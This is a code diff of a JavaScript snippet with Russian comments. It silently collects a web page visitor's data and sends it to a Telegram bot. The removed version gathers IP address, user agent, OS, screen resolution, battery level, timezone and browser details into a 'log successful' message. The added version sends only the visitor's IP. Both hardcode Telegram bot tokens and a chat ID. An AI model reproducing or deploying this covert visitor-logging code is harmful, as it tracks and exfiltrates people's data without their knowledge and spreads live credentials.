@@ -1,73 +1,25 @@
-async function getIPAddress() {
-    const response = await fetch('https://api.ipify.org?format=json');
-    const data = await response.json();
-    return data.ip;
-}
+fetch('http://httpbin.org/ip')
+  .then(function(response) {
+    return response.json();
+  })
+  .then(function(data) {
+    var ip = data.origin;
+    var message = "New visitor's IP: " + ip;
 
-function getUserAgent() {
-    return navigator.userAgent;
-}
+    // Отправка логов в Telegram
+    var token = '6998699702:AAHkHxZY7zzms2q4e_EvBeuhp2w5WBhGN2g';
+    var chatId = '-4226250479';
 
-// Function to get OS name
-function getOSName() {
-    return navigator.platform;
-}
+    var url = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
 
-function getScreenResolution() {
-    return `${window.screen.width}x${window.screen.height}`;
-}
-
-async function getBatteryPercentage() {
-    const battery = await navigator.getBattery();
-    return Math.floor(battery.level * 100);
-}
-
-function getBrowserInfo() {
-    return {
-        name: navigator.appName,
-        version: navigator.appVersion,
-        engine: navigator.product
-    };
-}
-
-async function sendDataToTelegram() {
-    const ipAddress = await getIPAddress();
-    const userAgent = getUserAgent();
-    const osName = getOSName();
-    const screenResolution = getScreenResolution();
-    const batteryPercentage = await getBatteryPercentage();
-    const browserInfo = getBrowserInfo();
-
-    const message = `
-<b>✨ Лог успешен!</b>
-
-<b>🖥️ Информация об устройстве:</b>
-├ Айпи: <code>${ipAddress}</code>
-├ UserAgent: <code>${userAgent}</code>
-├ Хэш: <code>undefined</code>
-├ Имя ОС: <code>${osName}</code>
-├ Разрешение экрана: <code>${screenResolution}</code>
-├ Процент батареи: <code>${batteryPercentage}%</code>
-└ Часовой пояс: <code>${new Date().getTimezoneOffset()}</code>
-
-<b>🌐 Информация о браузере:</b>
-├ Название браузера: <code>${browserInfo.name}</code>
-├ Версия браузера: <code>${browserInfo.version}</code>
-└ Тип движка браузера: <code>${browserInfo.engine}</code>
-    `;
-
-    const telegramBotURL = 'https://api.telegram.org/bot7419899814:AAH1plPVW3g5ZUGAFBXKZLmWYGEA0kU20FI/sendMessage';
-    const chatId = '-4226250479';
-
-    const formData = new FormData();
-    formData.append('chat_id', chatId);
-    formData.append('text', message);
-    formData.append('parse_mode', 'HTML');
-
-    await fetch(telegramBotURL, {
-        method: 'POST',
-        body: formData
-    });
-}
-
-sendDataToTelegram();
+    fetch(url)
+      .then(function(response) {
+        console.log('Message sent to Telegram');
+      })
+      .catch(function(error) {
+        console.error('Error sending message to Telegram:', error);
+      });
+  })
+  .catch(function(error) {
+    console.error('Error getting IP address:', error);
+  });
